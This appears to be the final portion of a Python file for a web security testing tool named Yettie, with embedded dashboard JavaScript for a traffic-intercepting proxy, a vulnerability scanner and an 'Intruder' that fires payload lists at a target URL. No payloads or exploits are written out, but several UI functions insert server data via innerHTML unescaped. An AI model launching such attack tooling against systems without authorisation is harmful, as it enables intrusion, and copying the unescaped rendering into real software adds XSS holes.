                    status: '',
                    limit: 50
                });
                const response = await fetch(`/api/intruder/jobs?${params.toString()}`);
                const jobs = await response.json();

                // Update intruder results tab
                const resultsTab = document.querySelector('#intruderResults');
                if (jobs && jobs.length > 0) {
                    resultsTab.innerHTML = `
                        <div class="request-list">
                            ${jobs.map(job => `
                                <div class="request-item">
                                    <div class="request-details">
                                        <div class="request-url">${job.name}</div>
                                        <div class="request-meta">
                                            <span>Status: ${job.status}</span>
                                            <span>Progress: ${job.progress}%</span>
                                            <span>Target: ${job.target_url}</span>
                                            <span>${formatTime(job.created)}</span>
                                        </div>
                                    </div>
                                    <div class="request-actions">
                                        <button class="btn btn-icon btn-sm btn-secondary" onclick="viewIntruderJob('${job.id}')">
                                            <i class="fas fa-eye"></i>
                                        </button>
                                        <button class="btn btn-icon btn-sm btn-danger" onclick="deleteIntruderJob('${job.id}')">
                                            <i class="fas fa-trash"></i>
                                        </button>
                                    </div>
                                </div>
                            `).join('')}
                        </div>
                    `;
                }

            } catch (error) {
                console.error('Error loading intruder jobs:', error);
            }
        }

        async function loadActivity() {
            const loading = document.getElementById('activityLoading');
            const content = document.getElementById('activityContent');

            loading.style.display = 'flex';
            content.style.display = 'none';

            try {
                // Simulate loading
                await new Promise(resolve => setTimeout(resolve, 500));

                content.innerHTML = `
                    <div class="request-list">
                        <div class="request-item">
                            <div class="request-details">
                                <div class="request-url">Started proxy server</div>
                                <div class="request-meta">
                                    <span>Just now</span>
                                </div>
                            </div>
                        </div>
                        <div class="request-item">
                            <div class="request-details">
                                <div class="request-url">Loaded dashboard</div>
                                <div class="request-meta">
                                    <span>1 minute ago</span>
                                </div>
                            </div>
                        </div>
                        <div class="request-item">
                            <div class="request-details">
                                <div class="request-url">Updated system status</div>
                                <div class="request-meta">
                                    <span>2 minutes ago</span>
                                </div>
                            </div>
                        </div>
                    </div>
                `;

                loading.style.display = 'none';
                content.style.display = 'block';

            } catch (error) {
                console.error('Error loading activity:', error);
                loading.style.display = 'none';
                content.innerHTML = '<div class="text-danger">Failed to load activity</div>';
                content.style.display = 'block';
            }
        }

        function filterRequests() {
            const filterText = document.getElementById('requestFilter').value.toLowerCase();
            const filterMethod = document.getElementById('methodFilter').value;

            document.querySelectorAll('#requestList .request-item').forEach(item => {
                const url = item.querySelector('.request-url').textContent.toLowerCase();
                const method = item.querySelector('.method-badge').textContent;

                const matchesText = !filterText || url.includes(filterText);
                const matchesMethod = !filterMethod || method === filterMethod;

                item.style.display = matchesText && matchesMethod ? '' : 'none';
            });
        }

        function filterScanResults() {
            const filterSeverity = document.getElementById('severityFilter').value;

            document.querySelectorAll('#scanResults .request-item').forEach(item => {
                const severity = item.querySelector('.severity-badge').textContent;

                const matchesSeverity = !filterSeverity || severity === filterSeverity;

                item.style.display = matchesSeverity ? '' : 'none';
            });
        }

        async function viewRequest(requestId) {
            try {
                const response = await fetch(`/api/requests/${requestId}`);
                const request = await response.json();

                currentRequestId = requestId;

                // Update modal content
                document.getElementById('requestRaw').textContent = 
                    `${request.method} ${request.scheme}://${request.host}:${request.port}${request.path}${request.query ? '?' + request.query : ''} ${'HTTP/1.1'}\n` +
                    request.headers.map(([key, value]) => `${key}: ${value}`).join('\\n') +
                    (request.body ? `\n\n${request.body}` : '');

                document.getElementById('responseRaw').textContent = 
                    `HTTP/1.1 ${request.response_code}\n` +
                    request.response_headers.map(([key, value]) => `${key}: ${value}`).join('\\n') +
                    (request.response_body ? `\n\n${request.response_body}` : '');

                // Show modal
                showModal('requestDetailModal');

            } catch (error) {
                console.error('Error viewing request:', error);
                alert('Failed to load request details');
            }
        }

        async function viewScanResult(resultId) {
            try {
                const res = await fetch(`/api/scanner/results/${resultId}`);
                if (!res.ok) throw new Error('Failed to load result');

                const result = await res.json();
                openResultModal(result);

            } catch (err) {
                console.error(err);
                showToast('Failed to load scan result', 'error');
            }
        }
        
        function openResultModal(result) {
             console.log(result);
            document.getElementById('scanResultModal').classList.remove('hidden');

            document.getElementById('resultTitle').innerHTML = `
                ${result.issue_type}
                <span class="severity-${result.severity.toLowerCase()}">${result.severity}</span>
            `;

            document.getElementById('resultMeta').innerHTML = `
                <b>URL:</b> ${result.url}<br>
                <b>Parameter:</b> ${result.parameter}<br>
                <b>Confidence:</b> ${result.confidence}<br>
                <b>CVSS:</b> ${result.cvss_score}<br>
                <b>CWE:</b> ${result.cwe_id}<br>
                <b>OWASP:</b> ${result.owasp_category}<br>
               <b>Status:</b> ${result.status}<br>
               <b>Detected:</b> ${formatTime(result.timestamp)}
            `;

            document.getElementById('tab-overview').textContent =
            result.description + '\\n\\n' + result.detail;

            document.getElementById('tab-request').textContent =
            result.request || 'No request captured';

            document.getElementById('tab-response').textContent =
            result.response || 'No response captured';

            document.getElementById('tab-remediation').textContent =
            result.remediation || 'No remediation info';
            switchScanResultTab('overview');
        }
        
        
        function switchScanResultTab(tab) {
            const modal = document.getElementById('scanResultModal');
            if (!modal) return;

            // Only tabs inside the scan result modal
            modal.querySelectorAll('.ta').forEach(t =>
                t.classList.remove('active')
            );

            modal.querySelectorAll('.ta-content').forEach(c =>
                c.classList.add('hidden')
            );

            // Activate selected tab
            const activeTab = modal.querySelector(`[data-tab="${tab}"]`);
            const content = modal.querySelector(`#tab-${tab}`);

            if (activeTab) activeTab.classList.add('active');
            if (content) content.classList.remove('hidden');
        }

        

        function closeResultModal() {
            document.getElementById('scanResultModal').classList.add('hidden');
        }




        function viewIntruderJob(jobId) {
            // Implement intruder job view
            alert(`View intruder job ${jobId}`);
        }

        function deleteIntruderJob(jobId) {
            if (confirm('Are you sure you want to delete this job?')) {
                fetch(`/api/intruder/jobs/${jobId}`, { method: 'DELETE' })
                    .then(() => {
                        loadIntruderJobs();
                        showToast('Job deleted successfully', 'success');
                    })
                    .catch(error => {
                        console.error('Error deleting job:', error);
                        showToast('Failed to delete job', 'error');
                    });
            }
        }

        function markAsFixed(resultId) {
            fetch(`/api/scanner/results/${resultId}/fixed`, { method: 'POST' })
                .then(() => {
                    loadScanResults();
                    showToast('Marked as fixed', 'success');
                })
                .catch(error => {
                    console.error('Error marking as fixed:', error);
                    showToast('Failed to mark as fixed', 'error');
                });
        }

        function markAsFalsePositive(resultId) {
            fetch(`/api/scanner/results/${resultId}/false-positive`, { method: 'POST' })
                .then(() => {
                    loadScanResults();
                    showToast('Marked as false positive', 'success');
                })
                .catch(error => {
                    console.error('Error marking as false positive:', error);
                    showToast('Failed to mark as false positive', 'error');
                });
        }

        function sendToRepeater(requestId) {
            if (!requestId && currentRequestId) {
                requestId = currentRequestId;
            }

            if (requestId) {
                switchTab('repeater');
                showToast('Request sent to Repeater', 'success');
            }
        }

        function sendToIntruder(requestId) {
            if (!requestId && currentRequestId) {
                requestId = currentRequestId;
            }

            if (requestId) {
                switchTab('intruder');
                showToast('Request sent to Intruder', 'success');
            }
        }

        async function toggleIntercept() {
            const button = document.getElementById('interceptToggle');
            const enabled = !interceptEnabled;

            try {
                const response = await fetch('/api/proxy/intercept/toggle', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ enabled })
                });

                const data = await response.json();
                interceptEnabled = data.enabled;

                button.innerHTML = `
                    <i class="fas fa-${interceptEnabled ? 'pause' : 'play'}"></i>
                    <span>Intercept: ${interceptEnabled ? 'On' : 'Off'}</span>
                `;

                button.className = `btn btn-${interceptEnabled ? 'secondary' : 'primary'} btn-sm`;

                showToast(`Intercept ${interceptEnabled ? 'enabled' : 'disabled'}`, 'success');

            } catch (error) {
                console.error('Error toggling intercept:', error);
                showToast('Failed to toggle intercept', 'error');
            }
        }

        async function checkIntercept() {
            if (!interceptEnabled) return;

            try {
                const response = await fetch('/api/proxy/intercept/items');
                const items = await response.json();

                if (items && items.length > 0) {
                    const item = items[0];
                    showInterceptModal(item);
                }

            } catch (error) {
                console.error('Error checking intercept:', error);
            }
        }

        function showInterceptModal(item) {
            document.getElementById('interceptType').textContent = 
                `${item.type.charAt(0).toUpperCase() + item.type.slice(1)} Interception`;
            document.getElementById('interceptContent').textContent = item.data;

            showModal('interceptModal');
        }

        async function interceptAction(action) {
            const modal = document.getElementById('interceptModal');
            const content = document.getElementById('interceptContent').textContent;

            try {
                await fetch(`/api/proxy/intercept/${modal.dataset.itemId}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        action, 
                        modified: content 
                    })
                });

                closeModal('interceptModal');
                showToast(`Request ${action === 'forward' ? 'forwarded' : 'dropped'}`, 'success');

            } catch (error) {
                console.error('Error processing intercept:', error);
                showToast('Failed to process intercept', 'error');
            }
        }

        function showScannerModal() {
            showModal('scannerModal');
        }
        
        function updateScanProgress(progress) {
            const bar = document.getElementById('scanProgressBar');
            const label = document.getElementById('scanProgressLabel');

            if (!bar || !label) return;

            bar.style.width = `${progress}%`;
            label.textContent = `${progress}%`;

            if (progress >= 100) {
                label.textContent = 'Completed ✔';
            }
        }

        
        
        async function pollScanStatus(scanId) {
            const interval = setInterval(async () => {
                    try {
                        const res = await fetch(`/api/scanner/status/${scanId}`);
                        const status = await res.json();

                        // Update UI
                        updateScanProgress(status.progress || 0);

                        if (status.status === 'completed') {
                            clearInterval(interval);
                            showToast('Scan completed 🎉', 'success');
                            //loadFindings(scanId);
                            loadScanResults();
                        }

                        if (status.status === 'failed') {
                            clearInterval(interval);
                            showToast('Scan failed ❌', 'error');
                        }

                        if (status.status === 'stopped') {
                            clearInterval(interval);
                            showToast('Scan stopped ⛔', 'warning');
                        }

                    } catch (err) {
                        console.error('Polling error:', err);
                        clearInterval(interval);
                    }
            }, 2000); // poll every 2 seconds
        }


        async function startScanner() {
            const target = document.getElementById('scanTarget').value;
            const scanType = document.getElementById('scanType').value;

            if (!target) {
                showToast('Please enter a target URL', 'warning');
                return;
            }

            try {
                const response = await fetch('/api/scanner/scan', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        url: target,
                        type: scanType,
                        project: project_id
                    })
                });

                const data = await response.json();

                closeModal('scannerModal');
                showToast(`Scan started: ${data.scan_id}`, 'success');
                
                pollScanStatus(data.scan_id);

                // Switch to scanner tab
                switchTab('scanner');

            } catch (error) {
                console.error('Error starting scan:', error);
                showToast('Failed to start scan', 'error');
            }
        }

        async function startAttack() {
            const targetUrl = document.getElementById('targetUrl').value;
            const attackType = document.getElementById('attackType').value;
            const requestTemplate = document.getElementById('requestTemplate').value;
            const payloadList = document.getElementById('payloadList').value;

            if (!targetUrl || !requestTemplate || !payloadList) {
                showToast('Please fill in all required fields', 'warning');
                return;
            }

            try {
                const response = await fetch('/api/intruder/jobs', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        name: `Attack on ${new URL(targetUrl).hostname}`,
                        target_url: targetUrl,
                        attack_type: attackType,
                        method: 'GET',
                        headers: [
                            { name: 'User-Agent', value: 'Yettie/1.0' }
                        ],
                        body_template: '',
                        payload_sets: [{
                            name: 'Payload Set 1',
                            payloads: payloadList.split('\\n').filter(p => p.trim())
                        }],
                        settings: {
                            threads: parseInt(document.getElementById('threadCount').value),
                            rate_limit: 0,
                            timeout: 30,
                            follow_redirects: document.getElementById('followRedirects').checked,
                            process_cookies: document.getElementById('processCookies').checked
                        },
                        project: project_id
                    })
                });

                const data = await response.json();

                showToast(`Attack started: ${data.job_id}`, 'success');

                // Start the job
                await fetch(`/api/intruder/jobs/${data.job_id}/start`, {
                    method: 'POST'
                });

                // Switch to results tab
                switchIntruderTab('results');
                loadIntruderJobs();

            } catch (error) {
                console.error('Error starting attack:', error);
                showToast('Failed to start attack', 'error');
            }
        }

        function newAttack() {
            // Reset form
            document.getElementById('targetUrl').value = '';
            document.getElementById('requestTemplate').value = `GET /search?q=§test§ HTTP/1.1
Host: localhost
User-Agent: Yettie/1.0
Accept: */*`;
            document.getElementById('payloadList').value = '';

            // Switch to positions tab
            switchIntruderTab('positions');

            showToast('New attack form ready', 'info');
        }

        function saveAttack() {
            // Implement save attack functionality
            showToast('Attack saved', 'success');
        }

        async function performDecoderOperation(operation) {
            const input = document.getElementById('decoderInput').value;

            if (!input.trim()) {
                showToast('Please enter some input', 'warning');
                return;
            }

            try {
                const response = await fetch('/api/decoder', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        operation,
                        input
                    })
                });

                const data = await response.json();

                if (data.error) {
                    showToast(`Error: ${data.error}`, 'error');
                    document.getElementById('decoderOutput').value = '';
                } else {
                    document.getElementById('decoderOutput').value = data.result;
                    showToast('Operation completed', 'success');
                }

            } catch (error) {
                console.error('Error performing decoder operation:', error);
                showToast('Failed to perform operation', 'error');
            }
        }

        function clearDecoder() {
            document.getElementById('decoderInput').value = '';
            document.getElementById('decoderOutput').value = '';
        }

        function copyResult() {
            const output = document.getElementById('decoderOutput');
            output.select();
            document.execCommand('copy');
            showToast('Copied to clipboard', 'success');
        }

        async function exportData() {
            const format = prompt('Enter export format (json, csv, har):', 'json');

            if (format && ['json', 'csv', 'har'].includes(format.toLowerCase())) {
                window.open(`/api/export/${format.toLowerCase()}`, '_blank');
                showToast(`Exporting data as ${format.toUpperCase()}`, 'success');
            }
        }

        async function clearData() {
            if (confirm('Are you sure you want to clear all data?')) {
                try {
                    // Clear requests
                    // Clear scan results
                    // Clear intruder jobs

                    showToast('All data cleared', 'success');

                    // Reload current tab
                    switchTab(currentTab);

                } catch (error) {
                    console.error('Error clearing data:', error);
                    showToast('Failed to clear data', 'error');
                }
            }
        }

        function clearHistory() {
            if (confirm('Are you sure you want to clear request history?')) {
                // Implement clear history
                loadRequests();
                showToast('Request history cleared', 'success');
            }
        }

        function startUpdates() {
            // Update status every 5 seconds
            updateInterval = setInterval(() => {
                updateStatus();
                checkIntercept();
            }, 5000);
        }

        async function updateStatus() {
            try {
                const response = await fetch('/api/status');
                const data = await response.json();

                // Update proxy status
                const proxyStatus = document.getElementById('proxyStatus');
                proxyStatus.className = `status-badge ${data.proxy?.running ? 'success' : 'danger'}`;
                proxyStatus.innerHTML = `<i class="fas fa-circle"></i><span>Proxy: ${data.proxy?.running ? 'Running' : 'Stopped'}</span>`;

                // Update request count
                document.getElementById('requestCount').innerHTML = 
                    `<i class="fas fa-exchange-alt"></i><span>Requests: ${data.proxy?.stats?.requests_processed || 0}</span>`;

            } catch (error) {
                console.error('Error updating status:', error);
            }
        }

        // Utility Functions
        function formatBytes(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        function formatTime(timestamp) {
            const date = new Date(timestamp);
            const now = new Date();
            const diff = now - date;

            if (diff < 60000) { // Less than 1 minute
                return 'Just now';
            } else if (diff < 3600000) { // Less than 1 hour
                const minutes = Math.floor(diff / 60000);
                return `${minutes}m ago`;
            } else if (diff < 86400000) { // Less than 1 day
                const hours = Math.floor(diff / 3600000);
                return `${hours}h ago`;
            } else {
                return date.toLocaleDateString();
            }
        }

        function showModal(modalId) {
            const modal = document.getElementById(modalId);
            modal.classList.add('show');
            modal.style.display = 'flex';
        }

        function closeModal(modalId) {
            const modal = document.getElementById(modalId);
            modal.classList.remove('show');
            modal.style.display = 'none';
        }

        function showToast(message, type = 'info') {
            // Create toast element
            const toast = document.createElement('div');
            toast.className = `toast toast-${type}`;
            toast.innerHTML = `
                <div class="toast-content">
                    <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
                    <span>${message}</span>
                </div>
            `;

            // Add to page
            document.body.appendChild(toast);

            // Remove after 3 seconds
            setTimeout(() => {
                toast.remove();
            }, 3000);

            // Add CSS for toast
            if (!document.querySelector('#toast-styles')) {
                const style = document.createElement('style');
                style.id = 'toast-styles';
                style.textContent = `
                    .toast {
                        position: fixed;
                        top: 20px;
                        right: 20px;
                        padding: 12px 20px;
                        background: white;
                        border-radius: var(--radius-md);
                        box-shadow: var(--shadow-lg);
                        z-index: 9999;
                        animation: slideIn 0.3s ease;
                        display: flex;
                        align-items: center;
                        gap: 10px;
                    }

                    .toast-success {
                        border-left: 4px solid var(--success-color);
                    }

                    .toast-error {
                        border-left: 4px solid var(--danger-color);
                    }

                    .toast-warning {
                        border-left: 4px solid var(--warning-color);
                    }

                    .toast-info {
                        border-left: 4px solid var(--info-color);
                    }

                    .toast-content {
                        display: flex;
                        align-items: center;
                        gap: 8px;
                    }

                    @keyframes slideIn {
                        from {
                            transform: translateX(100%);
                            opacity: 0;
                        }
                        to {
                            transform: translateX(0);
                            opacity: 1;
                        }
                    }
                `;
                document.head.appendChild(style);
            }
        }

        // Close modals on escape key
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                document.querySelectorAll('.modal.show').forEach(modal => {
                    closeModal(modal.id);
                });
            }
        });

        // Close modals when clicking outside
        document.addEventListener('click', (e) => {
            if (e.target.classList.contains('modal')) {
                closeModal(e.target.id);
            }
        });
        
        

    </script>
</body>
</html>'''


# =================================================================
# MAIN EXECUTION
# =================================================================

def main():
    """Main entry point"""
    try:
        logger.info("=" * 60)
        logger.info("Yettie Professional Advanced Edition v3.0")
        logger.info("Advanced Web Security Testing Platform")
        logger.info("=" * 60)

        # Start proxy server
        proxy.start()

        # Start Flask app
        logger.info(f"Web UI: http://{Config.UI_HOST}:{Config.UI_PORT}")
        logger.info(f"Proxy: http://{Config.PROXY_HOST}:{Config.PROXY_PORT}")
        logger.info(f"CA Certificate: {Config.CA_CERT_FILE}")
        logger.info("Press Ctrl+C to stop")

        # Run Flask app
        app.run(
            host=Config.UI_HOST,
            port=Config.UI_PORT,
            threaded=True,
            debug=False,
            use_reloader=False
        )

    except KeyboardInterrupt:
        logger.info("\nShutting down...")
    except Exception as e:
        logger.critical(f"Fatal error: {e}")
        traceback.print_exc()
    finally:
        proxy.stop()
        db_manager.close_all_connections()
        logger.info("Cleanup complete")


if __name__ == "__main__":
    main()